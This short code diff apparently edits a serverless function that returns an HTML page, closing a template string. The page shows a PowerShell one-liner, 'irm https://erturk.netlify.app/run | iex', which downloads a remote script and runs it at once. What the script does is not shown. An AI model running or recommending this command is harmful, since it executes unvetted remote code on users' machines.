@@ -100,7 +100,7 @@ catch {
   <pre style="background: #2d2d2d; color: #00e676; padding: 12px; border-radius: 8px; overflow-x: auto;">[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm https://erturk.netlify.app/run | iex</pre>
 </section>
 </body>
-</html>
+</html>`;
 
   const ua = (event.headers['user-agent'] || '').toLowerCase();
 
